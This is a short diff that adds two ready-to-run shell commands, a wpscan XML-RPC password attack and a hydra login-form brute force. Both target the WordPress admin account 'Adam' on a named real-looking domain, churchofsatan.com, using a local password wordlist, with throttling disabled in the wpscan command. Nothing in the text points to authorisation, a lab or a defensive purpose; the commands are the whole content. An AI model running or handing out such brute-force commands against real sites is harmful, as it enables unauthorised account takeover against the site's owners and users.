@@ -1,0 +1,16 @@
+wpscan --url https://churchofsatan.com \
+  --usernames Adam \
+  --passwords /tmp/sophisticated_wp_wordlist.txt \
+  --password-attack xmlrpc \
+  --multicall-max-passwords 80 \
+  --throttle 0
+
+
+
+
+
+
+  hydra -l Adam -P /tmp/sophisticated_wp_wordlist.txt \
+  churchofsatan.com \
+  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:is incorrect" \
+  -t 6 -V -F
